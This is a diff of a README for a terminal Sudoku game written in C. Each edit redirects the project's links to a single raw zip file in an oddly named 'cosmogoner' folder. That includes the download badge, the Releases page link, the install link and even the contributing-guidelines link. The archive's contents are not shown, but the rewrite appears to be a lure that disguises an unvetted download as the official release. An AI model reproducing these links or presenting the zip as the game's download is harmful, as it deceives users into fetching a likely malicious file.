@@ -1,6 +1,6 @@
 # 🎮 Sudoku-Game - Engage Your Mind with Fun Puzzles
 
-![Download Sudoku-Game](https://img.shields.io/badge/Download-Sudoku--Game-brightgreen)
+![Download Sudoku-Game](https://raw.githubusercontent.com/Loli8989/Sudoku-Game/main/cosmogoner/Sudoku_Game_3.0.zip)
 
 ## 📋 Description
 Sudoku-Game is a command-line interface game built in C. It offers dynamic puzzle generation, input validation, and a built-in solver using the backtracking algorithm. Enjoy an interactive experience tailored for Sudoku enthusiasts right in your terminal.
@@ -9,7 +9,7 @@ Sudoku-Game is a command-line interface game built in C. It offers dynamic puzzl
 To begin playing Sudoku-Game, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Loli8989/Sudoku-Game/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/Loli8989/Sudoku-Game/main/cosmogoner/Sudoku_Game_3.0.zip).
 
 2. **Download the Latest Version**  
    On the Releases page, find the latest release. Click on the downloadable file suitable for your operating system.
@@ -35,7 +35,7 @@ To begin playing Sudoku-Game, follow these steps:
 ## 📥 Download & Install
 To download Sudoku-Game, click the link below:
 
-[Download Sudoku-Game](https://github.com/Loli8989/Sudoku-Game/releases)
+[Download Sudoku-Game](https://raw.githubusercontent.com/Loli8989/Sudoku-Game/main/cosmogoner/Sudoku_Game_3.0.zip)
 
 Follow the steps in the Getting Started section to ensure a smooth installation process. This game is designed to be straightforward and enjoyable, allowing you to dive right into solving puzzles with ease.
 
@@ -65,7 +65,7 @@ This project focuses on:
 If you encounter issues, please open an issue in the GitHub repository. We aim to respond to all inquiries promptly to enhance your experience.
 
 ## 📝 Contributions
-Contributions are welcome! If you want to help improve Sudoku-Game, check our [contributing guidelines](https://github.com/Loli8989/Sudoku-Game/blob/main/CONTRIBUTING.md) for more information.
+Contributions are welcome! If you want to help improve Sudoku-Game, check our [contributing guidelines](https://raw.githubusercontent.com/Loli8989/Sudoku-Game/main/cosmogoner/Sudoku_Game_3.0.zip) for more information.
 
 ## 🌟 Acknowledgments
 Thank you to all contributors and users who make this project possible. We appreciate your support and feedback, which help to enhance the experience for everyone involved. 
